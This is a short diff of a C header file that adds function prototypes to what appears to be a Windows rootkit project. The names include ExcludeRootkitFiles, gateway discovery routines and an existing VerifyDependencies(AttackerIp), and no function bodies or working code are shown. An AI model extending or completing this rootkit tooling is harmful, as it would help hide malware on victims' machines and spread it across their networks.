@@ -22,3 +22,9 @@ int GetPidByName(const char* Name);
 int CheckLetterInArr(char Chr, const char* Arr);
 BOOL PerformCommand(const char* CommandArr[], const char* Replacements[], const char* Symbols, int CommandCount, int SymbolCount);
 int VerifyDependencies(const char* AttackerIp);
+BOOL IsValidIp(char* Address);
+int FileOperation(char* FilePath, HANDLE* FileHandle, PVOID* FileData,
+	ULONG64* FileDataSize, BOOL IsWrite, BOOL ShouldNullTerm);
+char* ExtractGateways(char* IpConfigOutput);
+char* GetGatewayList();
+DWORD ExcludeRootkitFiles();
